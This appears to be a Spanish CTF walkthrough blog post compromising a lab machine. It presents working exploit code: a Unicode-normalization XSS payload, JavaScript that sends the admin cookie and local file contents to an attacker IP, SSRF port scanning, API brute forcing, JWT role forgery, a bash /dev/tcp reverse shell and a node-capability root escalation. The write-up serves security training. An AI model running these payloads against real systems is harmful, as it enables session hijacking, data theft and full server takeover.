Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script **whichSystem.py** podremos conocer dicha información.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315113205.png>)
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 192.168.26.92 -oG allPorts
```

Observamos como nos reporta que nos encuentran un montón de puertos abiertos, como es común en las máquinas windows.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315113016.png>)

Ahora gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p80,22 -sCV 192.168.26.92 -oN targeted
```

En el segundo escaneo de **Nmap** no descubriremos nada interesante.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315113305.png>)

___
### Puerto 80 - HTTP (Apache)

Al acceder a la página web, veremos el siguiente texto, el cual nos indica que se está aplicando una normalización de caracteres y que el usuario **admin** está revisando los nuevos usuarios que se registran.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315181038.png>)

Registraremos un nuevo usuario (**trr0r**) y nos logearemos con el mismo, y veremos el contenido de la página privada.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315181116.png>)

En el código fuente de dicha página, veremos que hay un comentario indicando que existe una sección para los usuario con el rol **admin**.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315181134.png>)

Como bien hemos visto antes, el usuario **admin** está revisando los nuevos usuarios que se registran. Por lo tanto, registraremos un usuario que contenga un **XSS** que realicé una petición a un archivo alojado en nuestra máquina. Para ello, debemos de registrar un usuario con el siguiente contenido.

```html
＜script ｓｒｃ＝＂http：／／192．168．26．10／pwned．js＂＞＜／script＞
```

> Al registrar un usuario con los anteriores caracteres especiales (**Unicode**), evitaremos la comprobación que se realiza por caracteres como `>`, `<`, `"`, `/`, entre otros. Además, dado que se está aplicando una normalización de caracteres por detrás, finalmente estos serán convertidos a su forma original en **ASCII**.
{: .prompt-info }

Veremos como recibimos una petición al archivo `pwned.js`.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315181718.png>)

___
## Explotación
### XSS → Cookie Hijacking

El script `pwned.js` captura la cookie del usuario **admin** y la envía a nuestro servidor:

```js
let img = new Image()
img.src = "http://192.168.26.10/?cookie=" + document.cookie
```

Veremos que capturamos la cookie del administrador, por lo que podemos usarla para iniciar sesión como **admin**.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315181802.png>)

Estableceremos que nuestra cookie es la que acabamos de obtener, es decir la del usuario administrador. Veremos que conseguimos acceder a la sección del usuario administrador donde podemos generar **PDFs**.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315190221.png>)

El **PDF** que se nos genera contiene el siguiente contenido.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315190238.png>)

Al generar un **PDF**, observaremos que dicha funcionalidad permite hacer solicitudes al **localhost**.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315190248.png>)
### XSS → SSRF vía Dynamic PDF

Gracias al siguiente artículo [XSS to SSRF via Dynamic PDF](https://book.hacktricks.wiki/es/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html), podemos ver como acontecer un **SSRF** a través de la generación dinámica de **PDFs**.

Gracias al siguiente comando de bash, obtendremos un listado de los puertos más comunes.

```bash
for i in $(cat /usr/share/wordlists/SecLists/Discovery/Infrastructure/common-http-ports.txt); do echo -n "$i,"; done; echo
```

El siguiente contenido de `pwned.js` nos permitirá realizar un escaneo de los puertos abiertos internamente.

```js
function checkPorts(port){
  x=new XMLHttpRequest;
  x.onload=function(){new Image().src=`http://192.168.26.10/open?port=${port}`};
  x.open("GET",`http://localhost:${port}/`);x.send();
}

top_ports = [66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6346,6347,7001,7002,8000,8080,8443,8888,30821]

for (let port of top_ports){
  checkPorts(port)
}
```

Volveremos a generar un **PDF** y obtendremos la confirmación de que el puerto **3000** está abierto.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315190517.png>)

Para ver el contenido de dicho puerto, es decir la respuesta, el contenido de `pwned.js` deberá de ser el sigueinte.

```js
x=new XMLHttpRequest;
x.onload=function(){new Image().src=`http://192.168.26.10/?resText=${btoa(this.responseText)}`};
x.open("GET","http://localhost:3000/");x.send();
```

Veremos como recibimos una petición con el contenido codificado en **base64**.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315190908.png>)

Gracias a la siguiente instrucción de bash, conseguiremos decodificar el contenido que está en **base64**.

```bash
echo -n "eyJu..." | base64 -d | jq
```

Veremos que en el puerto **3000** (abierto internamente), se encuentra una **API** a través de la cual podemos ejecutar comandos tras previamente habernos logeado como un usuario con el rol de **admin**.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315191011.png>)
### XSS → SSRF → LFI

Mediante la vulnerabilidad **SSRF**, intentamos leer archivos locales en el servidor, es decir aplicar un **LFI**. Para ello, el contenido de `pwned.js` ha de ser el siguiente.

```js
x=new XMLHttpRequest;
x.onload=function(){new Image().src=`http://192.168.26.10/?resText=${btoa(this.responseText)}`};
x.open("GET","file:///etc/passwd");x.send();
```

Veremos como recibimos una petición codificada en **base64**.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315191255.png>)

Volveremos a usar la misma instrucción de bash para decodificar el contenido está en **base64**.

```js
echo -n "cm9.." | base64 -d | grep "sh$"
```

Veremos los usuarios del sistema que tienen una terminal válida.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315191327.png>)

En este caso, leeremos el contenido del fichero `/etc/apache2/sites-availables/000-default.conf`, para ello hemos de modificar el `pwned.js`.

Descubriremos que el **DocumentRoot** del sitio web está en `/var/www/html`, además veremos unas credenciales de acceso a la base de datos (no nos servirán de nada).

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315191533.png>)

Si intentamos leer el contenido de `/var/www/html/index.php` de la misma manera que lo hemos hecho hasta ahora, veremos que no lo lograremos. Por ello, es una buena razón para explorar una alternativa que nos permita visualizar el contenido de los archivos internos, lo cual será posible gracias al siguiente contenido de `pwned.js`.

```js
x=new XMLHttpRequest;
x.onload=function(){
  // No lo pasaremos a base64 (btoa), ya que si no, no funcionará
  new Image().src=`http://192.168.26.10/?resText=${this.responseText}`;
  // De igual forma, mostraremos el conteido en el pdf
  document.write(`<pre>${this.responseText}</pre>`) // Usaremos etiquetas preformateadas (<pre>) para ver el contenido correctamente
};
x.open("GET","file:///var/www/html/index.php");x.send();
```

En el **PDF** generado, veremos el contenido del `/var/www/html/index.php` y en el observemos una credenciales. 

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315223908.png>)
### XSS → SSRF → API

Volveremos a cambiar el contenido de `pwned.js`, en este caso aplicaremos un mini ataque de fuerza bruta para descubrir que usuario tiene capacidad de logearse en la **API**.

```js
function checkUser(username, password){
  x=new XMLHttpRequest;
  x.onload=function(){new Image().src=`http://192.168.26.10/?resText=${btoa(this.responseText)}`; document.write(`[+] Username: ${username} -> ` + this.responseText + "<br>")};
  let data = JSON.stringify({"username": username, "password": password})
  x.open("POST","http://localhost:3000/login");
  x.setRequestHeader("Content-Type", "application/json");
  x.send(data);
}

let users = [
['admin', 'dUnAyw92B7qD4OVIqWXd'],
['Łukasz', 'dQnwTCpdCUGGqBQXedLd'],
['Þór', 'EYNlxMUjTbEDbNWSvwvQ'],
['Ægir', 'DXwgeMuQBAtCWPPQpJtv'],
['Çetin', 'FuLqqEAErWQsmTQQQhsb'],
['José', 'FuLqqEAErWQsmTQQQhsb']
];

for (let user of users){
  document.write(`[+] Username: ${user[0]}<br>`)
  checkUser(user[0], user[1])
}
```

Veremos que ningún usuario es capaz de logearse en la **API**.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315231256.png>)

Modificaremos el nombre de usuario remplazando los caracteres especiales (**Unicode**) por caracteres **ASCII**. Tal y como vemos a continuación, el usuario **Jose** tiene capacidad de logearse en la **API**.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315231340.png>)

Gracias al siguiente contenido del `pwned.js`, conseguiremos logearnos con las credenciales **Jose:FuLqqEAErWQsmTQQQhsb**.

```js
x=new XMLHttpRequest;
x.onload=function(){new Image().src=`http://192.168.26.10/?resText=${btoa(this.responseText)}`};
let data = JSON.stringify({"username": "Jose", "password": "FuLqqEAErWQsmTQQQhsb"})
x.open("POST","http://localhost:3000/login");
x.setRequestHeader("Content-Type", "application/json");
x.send(data);
```

En la respuesta de la petición, veremos un mensaje y un token necesario para acceder al endpoint **/command**, el cual aparentemente nos permite ejecutar comandos.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315192528.png>)

Volveremos a modificar el `pwned.js`, para ejecutar un `ping` a nuestra máquina de atacante.

```js
x=new XMLHttpRequest;
x.onload=function(){new Image().src=`http://192.168.26.10/?resText=${btoa(this.responseText)}`};
let data = JSON.stringify({"command": "ping -c 1 192.168.26.10", "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikpvc2UiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0MjA2MzEwMSwiZXhwIjoxNzQyMDY2NzAxfQ.jeAgJaUcaF9gtDJYzc8ig9nxuP9D7ckC1s8g5Lh7rmM"})
x.open("POST","http://localhost:3000/command");
x.setRequestHeader("Content-Type", "application/json");
x.send(data);
```

En la respuesta, veremos que no tenemos acceso, pues dicho endpoint solo está permitido para el **admin**.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315192659.png>)

Si nos dirigimos a [jwt.io](https://jwt.io/) y pegamos nuestro token, veremos en la figura el campo **role**, por lo que lo modificaremos a **admin**.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315192837.png>)

Veremos que en el respuesta de la petición, nos devuelve el output del comando.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315192947.png>)

Además, veremos como recibimos la traza **ICMP** de la máquina víctima.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315193041.png>)

A continuación, lo que haremos será ponernos en escucha con **Netcat** (`nc -nlvp 443`) y enviarnos una **Reverse Shell** gracias al típico one liner de bash (`bash -c 'bash -i >& /dev/tcp/192.168.26.10/443 0>&1'").

```js
x=new XMLHttpRequest;
x.onload=function(){new Image().src=`http://192.168.26.10/?resText=${btoa(this.responseText)}`};
let data = JSON.stringify({"command": "bash -c 'bash -i >& /dev/tcp/192.168.26.10/443 0>&1'", "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikpvc2UiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDIwNjMxMDEsImV4cCI6MTc0MjA2NjcwMX0._wQ0-N-vcor-8oxK3YElOZ9J8AB1GINxo_qfK0aXE8k"})
x.open("POST","http://localhost:3000/command");
x.setRequestHeader("Content-Type", "application/json");
x.send(data);
```

Veremos como recibimos correctamente la **Reverse Shell**, por lo que habremos ganado acceso a la máquina vícitma.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315193125.png>)

___
## Escalada de privilegios
### Enumeración local

Tras ganar acceso, realizaremos un *+Tratamiento de la TTY*.

Despues de enumerar un buen rato enumeración, me doy cuanto con una **Capabilities** un tanto extraña e inusual.

```bash
getcap -r / 2>/dev/null
```

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315211239.png>)

Al ejecutar dicho binario sobre el que tengo la **Capability**, veremos que es una copia del binario **node**.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315211219.png>)
### Node | Capabilities

Nos dirigiremos a la siguiente página [GTFOBins - Node capability](https://gtfobins.github.io/gtfobins/node/#capabilities), y veremos que para elevar nuestros privilegio debemos ejecutar el siguiente comando. 

```bash
/usr/bin/yournode -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
```

Tras ejecutarlo, veremos que nos otorga una shell como **root**, completando la explotación de la máquina.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315211343.png>)